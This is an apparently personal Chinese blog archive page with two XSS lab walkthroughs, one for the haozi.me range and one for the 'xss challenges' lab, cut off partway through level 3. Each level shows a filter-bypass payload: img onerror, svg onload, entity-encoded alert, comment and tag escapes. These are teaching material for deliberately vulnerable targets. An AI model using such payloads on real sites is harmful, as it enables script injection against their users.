<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>文章归档 - Jay的个人博客</title>
    <meta charset="UTF-8">
    <meta name="description" content="记录分享学习">
    <meta name="keywords" content="记录,学习,分享">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="/assets/logoko.png" type="image/png" />
    <meta name="description" content="记录分享学习">
<meta property="og:type" content="website">
<meta property="og:title" content="Jay的个人博客">
<meta property="og:url" content="https://yyj-xx.github.io/archives/index.html">
<meta property="og:site_name" content="Jay的个人博客">
<meta property="og:description" content="记录分享学习">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Jay jay">
<meta property="article:tag" content="记录,学习,分享">
<meta name="twitter:card" content="summary">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1679977717828">
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1679977717828">
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(/assets/background.gif)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="Jay jay" class="mdui-btn mdui-btn-icon"><img src="/assets/avatar.jpg" alt="Jay jay"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="Jay jay">
            <img src="/assets/avatar.jpg" alt="Jay jay" alt="Jay jay">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>20</div>
        <div><span>标签</span>2</div>
        <div><span>分类</span>0</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                文章归档
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博客">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                关于博客
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                我的朋友
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://www.baidu.com/s?wd=" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://space.bilibili.com/436182677" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/yyj-xx/yyj-xx.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
      <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">学习</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E5%86%99%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">学习写博客</a>
    </div>
    
  </div>

    
    

    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2023 Jay jay
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        <br>人生需要不断的探索
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <section class="nexmoe-posts">
    
    <div class="nexmoe-post">
        <a href="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="haozixss线上靶场学习" class="lazyload">
                    <h1>haozixss线上靶场学习</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月28日</a>
            <a><i class="nexmoefont icon-areachart"></i>1.3k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
        </div>

        <article>
            
                <h2 id="haozixss简介"><a href="#haozixss简介" class="headerlink" title="haozixss简介"></a>haozixss简介</h2><p>haozi是一个在线练习xss的平台网址为<a target="_blank" rel="noopener" href="https://xss.haozi.me/">https://xss.haozi.me/</a></p>
<h2 id="haozixss学习通过"><a href="#haozixss学习通过" class="headerlink" title="haozixss学习通过"></a>haozixss学习通过</h2><p>打开靶场地址首先需要输入昵称然后就可以进入关卡<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-09-05.png" alt="登录" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-07-52.png" alt="提示" class="lazyload"></p>
<h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>这个游戏是要弹出图片显示出yes才能过关，首先来看第一关<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-12-20.png" alt="第一关" class="lazyload"><br>可以看到后端代码并没有对输入做限制直接构造弹窗代码<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-14-00.png" alt="成功" class="lazyload"><br>可以看到成功出现过关图片</p>
<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-16-29.png" alt="第二关" class="lazyload"><br>可以看到我们的输入包裹在一textarea标签中我们绕过的方法是闭合textarea标签构造语句<code>&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-18-18.png" alt="成功" class="lazyload"></p>
<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-19-04.png" alt="第三关" class="lazyload"><br>这里给出的限制是条件是input标签，我们可以尝试闭合input标签绕过<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-21-10.png" alt="成功" class="lazyload"></p>
<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-21-42.png" alt="第四关" class="lazyload"><br>这一关使用replace方法过滤了圆括号替换为空我们可以通过实体编码括号或反引号来过<code>&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;  或者 &lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-27-48.png" alt="成功" class="lazyload"></p>
<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-28-28.png" alt="第五关" class="lazyload"><br>这一关和第四关类似只不过将反引号也过滤了可以使用实体编码绕过<br><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-30-29.png" alt="成功" class="lazyload"></p>
<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-31-05.png" alt="第六关" class="lazyload"><br>这一关是限制了右注释符，并将有注释符转化为emoji表情，可以通过闭合注释来绕过使用<code>--!&gt;&lt;img src=1 onerror=alert(1)&gt;</code>来绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-34-06.png" alt="成功" class="lazyload"></p>
<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-34-47.png" alt="第七关" class="lazyload"><br>这一关将auto和on开头的词加上等于号就会变成下划线，加上大于号大于号也会变成下滑线，也就是说过滤了autoforce和onerror事件。我们可以使用一个换行的技巧前题是要加入一个type属性值image和src映射路径属性，然后再让等于号和属性分开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">type=&quot;image&quot; src=1 onerror<br>=alert(1)<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-52-31.png" alt="成功" class="lazyload"></p>
<h3 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-53-24.png" alt="第八关" class="lazyload"><br>这里使用正则将&lt;&gt;和&lt;/&gt;进行了限制，也就是说智能 &lt; 或者 &gt; ，总之不能闭合标签，使用img标签来过<code>&lt;img src=1 onerror=alert(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-57-12.png" alt="成功" class="lazyload"></p>
<h3 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-10-57-48.png" alt="第九关" class="lazyload"><br>这里对&lt;/ style&gt;进行过滤替换，并且style标签智能出现文本或者符号，js无法生效，可以模仿0x06的换行来绕过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">&lt;/style<br>&gt;&lt;img src=1 onerror=alert(1)&gt;<br><br>&lt;/style<br>&gt;&lt;script&gt;alert`1`&lt;/script&gt;<br><br>&lt;/style<br>&gt;&lt;svg onload=alert(1)&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-02-39.png" alt="成功" class="lazyload"></p>
<h3 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-04-04.png" alt="第十关" class="lazyload"><br>这里必须是给定url，后面用正常闭合就可以<code>https://www.segmentfault.com&gt;&quot;img src=1 onerror=&quot;alert(1)</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-14-34.png" alt="成功" class="lazyload"></p>
<h3 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-15-28.png" alt="第十一关" class="lazyload"><br>这里对一些符号进行了过滤转换为了实体编码，但img的src里是认实体编码的，这样直接和0x09一样直接输入就过了<code>https://www.segmentfault.com.haozi.me/j.js</code>引入第三方js或者使用url@语法进行跳转调用<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-27-48.png" alt="成功" class="lazyload"></p>
<h3 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-30-36.png" alt="第十二关" class="lazyload"><br>这里是将所有的字母转换成了大写，所以将alert(1)实体编码可以绕过<br><code>&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&quot;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-33-06.png" alt="成功" class="lazyload"></p>
<h3 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-33-44.png" alt="第十三关" class="lazyload"><br>这里增加了过滤script依旧使用实体编码绕过<code>&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&quot;&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-35-57.png" alt="成功" class="lazyload"></p>
<h3 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-36-33.png" alt="第十四关" class="lazyload"><br>这里使用正则过滤了&lt;、/、”、’这四种符号，并且指定了我们的input在注释语句中，首先考虑逃出注释使用右注释符闭合，不过这里注意我们在使用语句alert(1)时要换行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">--&gt;<br>alert(<span class="hljs-number">1</span>)<br>--&gt;<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-40-42.png" alt="成功" class="lazyload"></p>
<h3 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-41-22.png" alt="第十五关" class="lazyload"><br>这里用正则过滤了所有字母，并将小写转为大写，输入script标签就会转为_CRIPT，所以这里只能使用一个特殊符号 ſ ，它可以在转换为s而不被过滤，并且由于js中区分大小写，所以还需要将里面的js事件代码进行十进制的实体编码。<code>&lt;ſvg onload=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-44-15.png" alt="成功" class="lazyload"></p>
<h3 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-45-03.png" alt="第十六关" class="lazyload"><br>这里对一大堆符号进行了过滤，只要输入就会被转换为实体编码，并且在img标签中输入，html可以识别转换的编码，所以我们先闭合然后输入js事件函数alert再通过注释符将后面的注释就可以了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;);alert(1)</span><br><span class="hljs-string">--&gt;</span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-48-25.png" alt="成功" class="lazyload"></p>
<h3 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-49-09.png" alt="第十七关" class="lazyload"><br>这里是用window.data，这是window调用了全局变量，正好alert在window的全局中存在可以执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-50-57.png" alt="成功" class="lazyload"></p>
<h3 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-52-05.png" alt="第十八关" class="lazyload"><br>这里同样对一堆符号进行了过滤但我们发现双引号转义为&quot;其实这里并没有将双引号成功过滤，还可以使用绕过<code>&quot;);alert(&quot;1</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-55-45.png" alt="成功" class="lazyload"></p>
<h3 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-11-56-17.png" alt="最后一关" class="lazyload"><br>这里将双引号转换为&quot;和上一关相似，不同处是这里在console中输出，但console.log不在html标签里，也就相当于在html标签外面不能被编码，所以只能选择先在&quot;的前面加上一个转义符在进行转义，或者闭合script标签绕过。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">#法<span class="hljs-number">1</span><br>\<span class="hljs-string">&quot;);alert(1)//</span><br><span class="hljs-string">#法2</span><br><span class="hljs-string">\&quot;);alert(2)</span><br><span class="hljs-string">--&gt;</span><br><span class="hljs-string">#法3</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/28/haozixss%E7%BA%BF%E4%B8%8A%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/2023-03-28-12-01-52.png" alt="成功" class="lazyload"></p>
<h2 id="xss总结"><a href="#xss总结" class="headerlink" title="xss总结"></a>xss总结</h2><p>只要能闭合，让输入的成功以js执行就行</p>

            
        </article>
    </div>
    
    <div class="nexmoe-post">
        <a href="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/">
            
                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
                    <img data-src="/assets/background.gif" data-sizes="auto" alt="xss challenges学习" class="lazyload">
                    <h1>xss challenges学习</h1>
                </div>
            
        </a>

        <div class="nexmoe-post-meta nexmoe-rainbow">
            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月27日</a>
            <a><i class="nexmoefont icon-areachart"></i>2.7k 字</a>
            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 12 分钟</a>
        </div>

        <article>
            
                <h2 id="xss-challenge简介"><a href="#xss-challenge简介" class="headerlink" title="xss challenge简介"></a>xss challenge简介</h2><p>xss challenge是一个xss漏洞练习的平台，安装很简单，解压到phpstuday的www目录下访问即可。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-39-50.png" alt="xss challenge" class="lazyload"></p>
<h2 id="xsschallecge通关学习"><a href="#xsschallecge通关学习" class="headerlink" title="xsschallecge通关学习"></a>xsschallecge通关学习</h2><h3 id="level-1-学习"><a href="#level-1-学习" class="headerlink" title="level 1 学习"></a>level 1 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-44-47.png" alt="第一关" class="lazyload"><br>可以在url中看到有一个参数传递<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-45-52.png" alt="参数" class="lazyload"><br>源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-46-16.png" alt="第一关源码" class="lazyload"><br>可以看到php代码中接收到name并没有做任何处理直接展示，我们直接在参数中输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-49-34.png" alt="可以看到成功弹窗" class="lazyload"><br>点击确定后跳转到第二关</p>
<h3 id="level-2-学习"><a href="#level-2-学习" class="headerlink" title="level 2 学习"></a>level 2 学习</h3><p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-50-44.png" alt="第二关" class="lazyload"><br>我们直接尝试第一关的语句，没有弹窗但显示到了页面上语句<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-52-45.png" alt="没有弹窗" class="lazyload"><br>查看源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-10-54-10.png" alt="源码" class="lazyload"><br>发现使用htmlspecialchars函数把预定义的字符转换成了html实体<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-09-13.png" alt="没有弹窗" class="lazyload"><br>但是下边input框中的没有使用这个函数就可以构造闭和输入框来产生xss</p>
<p><strong>法1</strong><br>闭合搜索框来弹窗<br>直接输入<code>&lt;img src=&quot;#&quot; onerror=alert(1)&gt;</code>查看源码<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-15-31.png" alt="直接输入" class="lazyload"><br>我们闭合搜索框输入<code>&quot;&gt;&lt;img src=&quot;#&quot; onerror=alert(1)&gt;</code><br>前边加一个”&gt;首先闭合输入框然后再执行构造语句<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-21-47.png" alt="弹窗" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-23-53.png" alt="闭合" class="lazyload"><br><strong>法2</strong><br>鼠标滑过<code>&quot;onmouseover=alert(1)&gt;</code>弹窗<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-26-38.png" alt="鼠标滑过弹窗" class="lazyload"><br><strong>法3</strong><br>点击搜索框弹窗<code>&quot; onclick=alert(1)&gt;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-28-56.png" alt="点击框弹" class="lazyload"></p>
<h3 id="level-3-学习"><a href="#level-3-学习" class="headerlink" title="level 3 学习"></a>level 3 学习</h3><p><strong>补充知识</strong><br>js中一共有三种注释方式</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-comment">/*xxxxx*/</span>多行注释<br><span class="hljs-comment">//xxxx 单行注释</span><br>&lt;!- xxx 这种注释内容用混淆一般不推荐<br></code></pre></td></tr></table></figure>

<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-11-37-55.png" alt="第三关" class="lazyload"><br>可以看到两个地方都加了转换实体的函数，但是这个函数没有对单引号转换所以可以使用单引号闭合绕过，直接输入<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-21-44.png" alt="双引号" class="lazyload"><br>发现双引号直接被转义，我们尝试单引号<code>&#39;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&#39;</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-23-27.png" alt="单引号绕过" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-26-00.png" alt="尖括号过滤" class="lazyload"><br>可以发现左右尖括号被转义，这里需要右键查看网页源码才能看到<br>我们需要语句中没有被转义的字符我们构造<code>&#39; onclick=alert(1)</code><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/27/xss-challenges%E5%AD%A6%E4%B9%A0/2023-03-27-12-38-33.png" alt="尝试" class="lazyload"><br>尝试点击输入框没有弹窗出现，尝试分析页面<br><img data-fancybox="gallery" data-sizes="auto" 